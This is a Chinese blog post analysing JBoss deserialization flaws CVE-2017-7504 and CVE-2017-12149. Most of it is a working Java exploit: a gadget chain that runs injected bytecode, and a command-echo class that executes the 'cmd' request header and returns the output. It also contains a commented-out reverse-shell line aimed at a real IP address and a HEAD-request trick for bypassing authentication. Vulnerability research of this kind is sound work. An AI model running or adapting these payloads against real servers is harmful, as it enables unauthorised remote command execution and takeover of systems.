---
layout: post
title: JBOSS漏洞分析
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---

 

## 前言

```java
JBoss是一个基于J2EE开发源代码的应用服务器，是一个开源的。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB2.0和EJB3的规范， 但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或 Jetty绑定使用。
```

## CVE-2017-7504

这个漏洞仅仅是一个反序列化的,下载地址：https://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA

```java
影响版本：JBoss AS 4.x及之前版本
```

安装成功后需要修改`jboss-4.2.3.GA/server/all/deploy/jboss-web.deployer/server.xml`，设置远程访问

![image-20231211175121457](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211175121457.png)

#### 漏洞分析

看到

`jboss-4.2.3.GA/server/all/deploy-hasingleton/jms/jbossmq-httpil.sar/jbossmq-httpil.war/WEB-INF/web.xml`

可以看到这是一个servlet，可以通过设置路由进行访问

![image-20231211175933929](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211175933929.png)

存在一个 HTTPServerILServlet 的 servlet，跟进到类

`org.jboss.mq.il.http.servlet.HTTPServerILServlet`

直接对输入的流进行readObject造成漏洞

![image-20231211180245356](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211180245356.png)

## CVE-2017-12149

```java
影响版本：5.x、6.x
```

下载地址：https://jbossas.jboss.org/downloads/，我这里下载的版本为JBoss AS 6.1.0.Final

#### 漏洞分析

漏洞触发点在`org.jboss.invocation.http.servlet.ReadOnlyAccessFilter#doFilter`方法
![image-20231211184114359](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211184114359.png)

可以看出它从POST中获取数据，然后调用readObject()方法对数据流进行反序列化

在web.xml中发现了过滤路由的位置

![image-20231211184540781](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211184540781.png)

在`org.jboss.invocation.http.servlet.InvokerServlet#processRequest`同样存在反序列化点
![image-20231211185406822](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211185406822.png)

并且，doget 、dopost都会调用processRequest这个方法

![image-20231211185550700](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211185550700.png)

有危险的路由

```java
/invoker/readonly/*
/invoker/JMXInvokerServlet/*
/invoker/EJBInvokerServlet/*
/invoker/JMXInvokerHAServlet/*
/invoker/EJBInvokerHAServlet/*
/invoker/restricted/JMXInvokerServlet/* (需要登录)
```

可利用的jar包依赖

```java
commons-collections-3.1.jar
commons-beanutils-1.8.0.jar
hibernate-core-3.6.6.Final.jar
```

访问500错误说明有漏洞，这里先用工具实验一下，（[yunxu1/jboss-_CVE-2017-12149: CVE-2017-12149 jboss反序列化 可回显 (github.com)](https://github.com/yunxu1/jboss-_CVE-2017-12149)）

![image-20231211190754041](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211190754041.png)

![image-20231211191257461](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211191257461.png)

#### JBossInterceptors1

```java


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javassist.*;

import javassist.ClassPool;
import org.jboss.interceptor.builder.InterceptionModelBuilder;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.interceptor.reader.DefaultMethodMetadata;
import org.jboss.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.interceptor.spi.metadata.InterceptorReference;
import org.jboss.interceptor.spi.metadata.MethodMetadata;
import org.jboss.interceptor.spi.model.InterceptionModel;
import org.jboss.interceptor.spi.model.InterceptionType;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.*;

import org.jboss.interceptor.builder.InterceptionModelBuilder;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.interceptor.proxy.InterceptorInvocation;
import org.jboss.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.interceptor.spi.instance.InterceptorInstantiator;

import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class poc {
    public static String string;
    public static void main(String[] args) throws NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {

//public InterceptorMethodHandler(Object targetInstance,
// ClassMetadata<?> targetClassMetadata,
// InterceptionModel<ClassMetadata<?>, ?> interceptionModel,
// InterceptorInstantiator<?, ?> interceptorInstantiator,
// InvocationContextFactory invocationContextFactory)


        InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set<InterceptionType> s = new HashSet<InterceptionType>();
        s.add(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE);

        Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        defaultMethodMetadataConstructor.setAccessible(true);
        MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s, MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));

        List list = new ArrayList();
        list.add(methodMetadata);
        Map<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();

        hashMap.put(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
        SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);

        builder.interceptAll().with(simpleInterceptorMetadata);

        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put("ysoserial", "ysoserial");

//        TemplatesImpl obj = new TemplatesImpl();
//        setFieldValue(obj, "_bytecodes", new byte[][]{ClassPool.getDefault().get(Evil.class.getName()).toBytecode()});
//        setFieldValue(obj, "_name", "1");
//        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        TemplatesImpl obj=(TemplatesImpl)getTemplatesImpl();

        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();

        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
            public Object createFor(InterceptorReference paramInterceptorReference) {
                return obj;
            }
        };
        InterceptorMethodHandler exp = new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(baos);
        out.writeObject(exp);
        out.close();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();



//        org.jboss.interceptor.proxy.InterceptorMethodHandler
//        TemplatesImpl templates=(TemplatesImpl) getTemplatesImpl();
//        templates.newTransformer();




    }
    public static Object getTemplatesImpl() throws IOException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException {
        TemplatesImpl templates=new TemplatesImpl();
        byte[] evilBytes=getEvilBytes();
        setFieldValue(templates,"_name","JYcxk");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(templates,"_bytecodes",new byte[][]{evilBytes});
        return templates;

    }
    public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException {
        Class clazz=object.getClass();
        Field declaredField=clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object,filed_value);
    }
    public static byte[] getEvilBytes() throws NotFoundException, CannotCompileException, IOException, NotFoundException, CannotCompileException, NotFoundException, CannotCompileException {
        ClassPool classPool = new ClassPool(true);
        CtClass hello = classPool.makeClass("Hello");
        CtClass ctClass = classPool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        hello.setSuperclass(ctClass);
        CtConstructor ctConstructor=new CtConstructor(new CtClass[]{},hello);
        //ctConstructor.setBody("java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/101.42.224.57/8080 0>&1\"});");
        ctConstructor.setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        hello.addConstructor(ctConstructor);
        byte[] bytes=hello.toBytecode();
        hello.detach();
        return bytes;
    }
    public static void serialize(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }
    public static void unserialize() throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}

```

```java
getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:74, InterceptorInvocation$InterceptorMethodInvocation (org.jboss.interceptor.proxy)
invokeNextInterceptor:87, SimpleInterceptionChain (org.jboss.interceptor.proxy)
executeInterception:133, InterceptorMethodHandler (org.jboss.interceptor.proxy)
readObject:158, InterceptorMethodHandler (org.jboss.interceptor.proxy)
```

直接进行调用链分析：

看到`org.jboss.interceptor.proxy.InterceptorMethodHandler`的初始化

#### 任意调用方法的点在`InterceptorInvocation$InterceptorMethodInvocation`内部类中，并且内部类构造方法是包权限，

里面的invoke我们调用后面invoke，因为要用Templates#newTransformer()无参数

this.method.getJavaMethod().invoke(this.instance);

```java
 public class InterceptorMethodInvocation {
        T instance;
        MethodMetadata method;

        InterceptorMethodInvocation(T instance, MethodMetadata method) {
            this.instance = instance;
            this.method = method;
        }

        Object invoke(InvocationContext invocationContext) throws Exception {
            return invocationContext != null ? this.method.getJavaMethod().invoke(this.instance, invocationContext) : this.method.getJavaMethod().invoke(this.instance);
                     //getJavaMethod()就是一个封装很好实现，instance需要成为我们的Templates对象，是个泛型应该也没问题
        }
```

#### ![image-20231211203211336](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231211203211336.png)

简单看一下就行，就是初始化类的时候有些复杂。

## 回显构造

需要用一下idea中的远程调试

首先先看一下当前线程：Thread.currentThread()

![image-20231212161801019](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231212161801019.png)

遍历线程组可以获取到：org.apache.catalina.connector.Request，然后通过getResponse()方法得到Response，最后getWriter()方法回显，代码如下：

```java
Object resp=Thread.currentThread().threadLocals.table[27].value;	
Object writer=resp.getClass().getDeclaredMethod("getOutputStream").invoke(resp);
writer.getClass().getDeclaredMethod("write",byte[].class).invoke(writer,"hello".getBytes());
writer.getClass().getDeclaredMethod("flush").invoke(writer);
```

但是数组的顺序是不确定的，所以需要用一种方式来代替：

数组的下标，通过org.apache.catalina.connector.Request 来代替

接下来的思路就是Entry[]table中某个值如何获取，table属于ThreadLocalMap的字段值， 可以通过如下方式获取

```java
Class threadLocalMapClass=Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
Field tableFiled=threadLocalMapClass.getDeclaredField("table");
tableFiled.setAccessible(true);
```

这里获得的table是个数组，其具体值要通过get获得。value则属于Entry类的属性，同样它的值也需要反射get方法获得。

```java
Class entryClass=Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
Field entryValueField=entryClass.getDeclaredField("value");
entryValueField.setAccessible(true);
```

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class JbossEcho extends AbstractTranslet{
    static {
        try {
            Thread thread = Thread.currentThread();
            Field threadLocals = Thread.class.getDeclaredField("threadLocals");
            threadLocals.setAccessible(true);
            Object threadLocalMap = threadLocals.get(thread);

            Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            Field tableField = threadLocalMapClazz.getDeclaredField("table");
            tableField.setAccessible(true);
            Object[] Entries = (Object[]) tableField.get(threadLocalMap);

            Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            Field entryValueField = entryClass.getDeclaredField("value");
            entryValueField.setAccessible(true);

            for (Object entry : Entries) {
                if (entry != null) {
                    try {
                        Object httpConnection = entryValueField.get(entry);
                        if (httpConnection != null) {
                            if (httpConnection.getClass().getName().equals("org.apache.catalina.connector.Request")) {
                                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request)httpConnection;
                                org.apache.catalina.connector.Response response = request.getResponse();
                                response.setStatus(200);
                                boolean isLinux = true;
                                String osTyp = System.getProperty("os.name");
                                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                                    isLinux = false;
                                }
                                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getHeader("cmd")} : new String[]{"cmd.exe", "/c", request.getHeader("cmd")};
                                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                                Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
                                String output = scanner.hasNext() ? scanner.next() : "";
                                response.getWriter().write(output);
                                response.getWriter().flush();
                            }
                        }
                    } catch (IllegalAccessException e) {
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
}
```



## 绕过waf

```java
/invoker/readonly/*
/invoker/JMXInvokerServlet/*
/invoker/EJBInvokerServlet/*
/invoker/JMXInvokerHAServlet/*
/invoker/EJBInvokerHAServlet/*
/invoker/restricted/JMXInvokerServlet/* (需要登录)
```

这是上面的危险路由，我们利用的是/invoker/readonly因为是filter所以不存在被拦截，

![image-20231212165129638](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231212165129638.png)

但是这里加个鉴权/restricted/* 中，并且不能使用GET、POST方法

![image-20231212165406095](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231212165406095.png)

可以看到 HEAD 头会调用doGet，而 GET 也会触发反序列，所以可以绕过登录实现反序列化
但是由于是NobodyResponse，所以我们需要在header头实现回显，改为：

```java
response.addHeader("echo",output);
response.flushBuffer();
```

并且用HEAD请求方法即可
